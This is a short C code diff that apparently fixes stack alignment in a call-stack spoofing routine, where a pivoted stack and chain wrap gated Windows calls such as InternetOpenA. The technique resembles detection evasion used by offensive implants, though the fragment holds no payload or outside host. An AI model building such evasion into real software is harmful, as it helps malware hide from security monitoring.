@@ -174,7 +174,11 @@ static void gate_init_spoof(void)
 	 * value matches what gate_spoof_recovery expects. */
 	/* pivot near the top: 252KB of headroom below for the gated call's
 	 * tree, chain + parked recovery laid above toward the page end */
-	g_gate_pivot = (unsigned long long)g_gate_page + 0x3f000;
+		/* pivot + 8: x64 ABI expects rsp==8 (mod 16) at fn ENTRY (a real call
+	 * pushes an 8-byte retaddr onto an aligned rsp) - jmp does not push,
+	 * so the pivot itself must carry the +8. Misaligned entry killed
+	 * InternetOpenA's tree at WININET!_tailMerge_iertutil_dll movdqa. */
+	g_gate_pivot = (unsigned long long)g_gate_page + 0x3f008;
 	slot = g_gate_pivot + 0x80; /* above the parked recovery slot */
 	if (slot + 0x300 > g_gate_pivot + 0x1000) { /* chain must fit the top margin */
 		g_gate_spoof_ready = 2;
